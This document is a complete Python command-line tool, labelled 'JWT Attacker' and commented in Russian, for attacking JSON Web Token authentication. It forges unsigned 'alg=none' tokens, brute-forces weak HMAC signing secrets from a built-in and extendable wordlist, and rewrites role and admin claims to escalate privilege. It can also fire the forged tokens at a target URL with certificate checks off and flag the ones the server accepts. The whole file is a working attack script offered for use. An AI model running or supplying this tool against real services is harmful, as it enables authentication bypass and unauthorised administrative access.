#!/usr/bin/env python3
import base64
import hmac
import hashlib
import json
import requests
import argparse
import sys
import re
import warnings
warnings.filterwarnings("ignore")
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"
# Слабые секреты для брутфорса
WEAK_SECRETS = [
"secret", "password", "123456", "qwerty", "admin", "token",
"jwt_secret", "mysecret", "your-256-bit-secret", "changeme",
"supersecret", "p@ssword", "letmein", "welcome", "test",
"key", "secretkey", "jwtkey", "auth", "access_token",
"HS256", "RS256", "private", "api_secret", "app_secret",
]
def b64_decode_padding(data: str) -> bytes:
"""Base64url декодирование с добавлением паддинга."""
data += "=" * (4 - len(data) % 4)
return base64.urlsafe_b64decode(data)
def b64_encode(data: bytes) -> str:
"""Base64url кодирование без паддинга."""
return base64.urlsafe_b64encode(data).rstrip(b"=").decode()
def decode_jwt(token: str) -> tuple[dict, dict, str] | None:
"""Декодирует JWT без верификации. Возвращает (header, payload,
signature)."""
parts = token.split(".")
if len(parts) != 3:
print(f"{RED}[!] Невалидный JWT (должно быть 3 части через '.'){RESET}")
return None
try:
header = json.loads(b64_decode_padding(parts[0]))
payload = json.loads(b64_decode_padding(parts[1]))
return (header, payload, parts[2])
except Exception as e:
print(f"{RED}[!] Ошибка декодирования JWT: {e}{RESET}")
return None
def encode_jwt(header: dict, payload: dict, secret: str = "",
algorithm: str = "HS256") -> str:
header_b64 = b64_encode(json.dumps(header, separators=(",", ":")).encode())
payload_b64 = b64_encode(json.dumps(payload, separators=(",", ":")).encode())
signing_input = f"{header_b64}.{payload_b64}"
if algorithm.lower() == "none":
return f"{signing_input}."
if algorithm == "HS256":
sig = hmac.new(secret.encode(), signing_input.encode(),
hashlib.sha256).digest()
return f"{signing_input}.{b64_encode(sig)}"
if algorithm == "HS384":
sig = hmac.new(secret.encode(), signing_input.encode(),
hashlib.sha384).digest()
return f"{signing_input}.{b64_encode(sig)}"
if algorithm == "HS512":
sig = hmac.new(secret.encode(), signing_input.encode(),
hashlib.sha512).digest()
return f"{signing_input}.{b64_encode(sig)}"
return f"{signing_input}." # Fallback: none
def attack_none_algorithm(header: dict, payload: dict) -> list[str]:
variants = ["none", "None", "NONE", "nOnE", "NonE"]
tokens = []
for alg_none in variants:
new_header = header.copy()
new_header["alg"] = alg_none
token = encode_jwt(new_header, payload, algorithm="none")
tokens.append(token)
return tokens
def attack_brute_force(token: str, wordlist: list[str]) -> str | None:
parts = token.split(".")
signing_input = f"{parts[0]}.{parts[1]}"
original_sig = b64_decode_padding(parts[2])
for secret in wordlist:
for alg, hash_fn in [("HS256", hashlib.sha256),
("HS384", hashlib.sha384),
("HS512", hashlib.sha512)]:
sig = hmac.new(secret.encode(), signing_input.encode(), hash_fn).digest()
if sig == original_sig:
return secret
return None
def test_token(url: str, token: str, header_name: str,
session: requests.Session) -> tuple[int, str]:
headers = {header_name: f"Bearer {token}" if "auth" in header_name.lower()
else token}
try:
resp = session.get(url, headers=headers, timeout=5, verify=False)
return (resp.status_code, resp.text[:200])
except Exception:
return (0, "")
def modify_payload_admin(payload: dict) -> dict:
modified = payload.copy()
# Стандартные поля для изменения на admin
admin_fields = {
"role": "admin",
"user_role": "admin",
"is_admin": True,
"admin": True,
"isAdmin": True,
"privilege": "admin",
"scope": "admin read write delete",
}
for field, value in admin_fields.items():
if field in modified:
original = modified[field]
modified[field] = value
print(f" {YELLOW}→ Изменяем '{field}': {original!r} → {value!r}{RESET}")
return modified
def main():
parser = argparse.ArgumentParser(description="JWT Attacker")
parser.add_argument("-t", "--token", required=True, help="JWT токен")
parser.add_argument("-u", "--url", default=None,
help="URL для тестирования токена (опционально)")
parser.add_argument("--attack",
 default="all",
choices=["all", "none", "brute", "modify"],
help="Тип атаки")
parser.add_argument("--header",
 default="Authorization",
help="HTTP заголовок для токена")
parser.add_argument("--wordlist", default=None,
help="Путь к файлу со словарём для брутфорса")
args = parser.parse_args()
session = requests.Session()
# Декодируем токен
result = decode_jwt(args.token)
if not result:
sys.exit(1)
header, payload, signature = result
print(f"{CYAN}{'='*60}")
print(" JWT DECODER")
print(f"{'='*60}{RESET}")
print(f"{GREEN}Header: {json.dumps(header, indent=2)}{RESET}")
print(f"{GREEN}Payload: {json.dumps(payload, indent=2,
ensure_ascii=False)}{RESET}")
print(f"{CYAN}Algorithm: {header.get('alg', 'unknown')}{RESET}")
print()
if args.attack in ("all", "none"):
print(f"{YELLOW}[*] Атака 1: Algorithm None{RESET}")
modified_payload = modify_payload_admin(payload)
none_tokens = attack_none_algorithm(header, modified_payload)
for tok in none_tokens:
alg = decode_jwt(tok)[0].get("alg", "?")
print(f" Сгенерирован токен (alg={alg}): {tok[:80]}...")
if args.url:
status, body = test_token(args.url, tok, args.header, session)
if status == 200:
print(f" {GREEN}[HIT] HTTP 200! Сервер принял токен без
подписи!{RESET}")
print(f" Ответ: {body[:100]}")
elif status in (403, 401):
print(f" {RED}[-] HTTP {status} — отклонён{RESET}")
else:
print(f" {YELLOW}[?] HTTP {status}{RESET}")
if args.attack in ("all", "brute"):
print(f"\n{YELLOW}[*] Атака 2: Брутфорс HMAC секрета{RESET}")
wordlist = WEAK_SECRETS.copy()
if args.wordlist:
try:
with open(args.wordlist) as f:
wordlist += [line.strip() for line in f if line.strip()]
except FileNotFoundError:
print(f"{RED}[!] Файл словаря не найден{RESET}")
print(f" Пробуем {len(wordlist)} секретов...")
secret = attack_brute_force(args.token, wordlist)
if secret:
print(f" {GREEN}[HIT] Секрет найден: '{secret}'{RESET}")
print(f" {YELLOW}→ Теперь можем создавать любые валидные
токены!{RESET}")
# Создаём admin токен с найденным секретом
admin_payload = modify_payload_admin(payload)
admin_token = encode_jwt(header, admin_payload, secret,
header.get("alg", "HS256"))
print(f" Admin token: {admin_token[:80]}...")
else:
print(f" {RED}[-] Секрет не найден в данном словаре{RESET}")
if args.attack == "modify" and args.url:
print(f"\n{YELLOW}[*] Атака 3: Модификация payload (если подпись не
проверяется){RESET}")
modified = modify_payload_admin(payload)
# Отправляем без подписи
for alg in ["none", "None"]:
new_header = header.copy()
new_header["alg"] = alg
tok = encode_jwt(new_header, modified, algorithm="none")
status, body = test_token(args.url, tok, args.header, session)
print(f" alg={alg} → HTTP {status}")
print(f"\n{CYAN}{'='*60}{RESET}")
if __name__ == "__main__":
main()
